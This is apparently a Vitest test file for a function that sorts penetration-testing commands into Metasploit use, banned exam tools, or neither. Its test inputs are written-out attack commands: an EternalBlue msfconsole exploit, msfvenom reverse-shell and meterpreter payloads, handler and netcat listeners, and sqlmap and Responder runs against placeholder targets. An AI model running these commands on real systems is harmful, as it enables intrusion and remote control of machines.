import { describe, expect, it } from 'vitest';
import { classifyExam } from '../../../engines/fieldManual/classifyExam';

describe('classifyExam', () => {
  it('classifyExam marks msfconsole use-exploit commands as metasploit', () => {
    expect(classifyExam('msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; run"')).toBe('metasploit');
    expect(classifyExam('use auxiliary/scanner/smb/smb_version')).toBe('metasploit');
    expect(classifyExam('meterpreter > getuid')).toBe('metasploit');
  });

  it('classifyExam marks msfvenom with meterpreter as metasploit', () => {
    expect(classifyExam('msfvenom -p windows/meterpreter/reverse_tcp LHOST={LHOST} -f exe')).toBe('metasploit');
  });

  it('classifyExam leaves a staged handler with no meterpreter unclassified', () => {
    expect(classifyExam('msfvenom -p windows/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe')).toBeUndefined();
    expect(classifyExam('nc -lvnp {LPORT}')).toBeUndefined();
  });

  it('classifyExam bans a prohibited card', () => {
    expect(classifyExam('sqlmap -u x', 'prohibited')).toBe('banned');
  });

  it('classifyExam bans prohibited automatic tools by command word', () => {
    expect(classifyExam('sqlmap -u http://{TARGET_IP}/?id=1')).toBe('banned');
    expect(classifyExam('sudo sqlmap -u x')).toBe('banned');
    expect(classifyExam('nessuscli update')).toBe('banned');
    expect(classifyExam('cd /tmp && python3 sqlmap.py -u x')).toBe('banned');
  });

  it('classifyExam bans responder without analyse mode and allows -A', () => {
    expect(classifyExam('responder -I tun0')).toBe('banned');
    expect(classifyExam('sudo responder -I tun0 -A')).toBeUndefined();
    expect(classifyExam('responder -I tun0 --analyze')).toBeUndefined();
  });

  it('classifyExam does not ban wpscan or a sqlmap mention in a comment', () => {
    expect(classifyExam('wpscan --url http://{TARGET_IP}')).toBeUndefined();
    expect(classifyExam("# don't use sqlmap\nsqlmap_notes=1\nls")).toBeUndefined();
  });

  it('classifyExam lets banned win over metasploit', () => {
    expect(classifyExam('msfconsole', 'prohibited')).toBe('banned');
  });

  it('classifyExam never counts a multi/handler alone, but a meterpreter payload always counts', () => {
    expect(
      classifyExam('msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell/reverse_tcp; set LHOST {LHOST}; run -j"'),
    ).toBeUndefined();
    expect(classifyExam('msfconsole -q -x "use exploit/multi/handler; set payload windows/shell_reverse_tcp; run"')).toBeUndefined();
    expect(classifyExam('msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; run"')).toBe('metasploit');
    expect(classifyExam('msfvenom -p windows/x64/meterpreter_reverse_https LHOST={LHOST} -f exe -o s.exe')).toBe('metasploit');
    expect(classifyExam('msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST={LHOST} -f elf')).toBe('metasploit');
    expect(classifyExam('use post/multi/recon/local_exploit_suggester')).toBe('metasploit');
  });

  it('classifyExam does not count listing meterpreter payloads', () => {
    expect(classifyExam('msfvenom -l payloads | grep meterpreter')).toBeUndefined();
  });

  it('classifyExam reads combined short flags for responder', () => {
    expect(classifyExam('responder -I tun0 -Av')).toBeUndefined();
    expect(classifyExam('responder -I tun0 -vA')).toBeUndefined();
    expect(classifyExam('responder -I tun0 -v')).toBe('banned');
    expect(classifyExam('sudo responder -I tun0 -wv')).toBe('banned');
  });

  it('classifyExam looks past wrapper prefixes to the command word', () => {
    expect(classifyExam('sudo -u kali sqlmap -u x')).toBe('banned');
    expect(classifyExam('proxychains sqlmap -u http://{TARGET_IP}/')).toBe('banned');
    expect(classifyExam('proxychains4 -q sqlmap -u x')).toBe('banned');
    expect(classifyExam('time sqlmap -u x')).toBe('banned');
    expect(classifyExam('env HTTP_PROXY=http://127.0.0.1:8080 sqlmap -u x')).toBe('banned');
    expect(classifyExam('sudo proxychains -q responder -I tun0')).toBe('banned');
    expect(classifyExam('proxychains -q nmap -sT {TARGET_IP}')).toBeUndefined();
  });
});
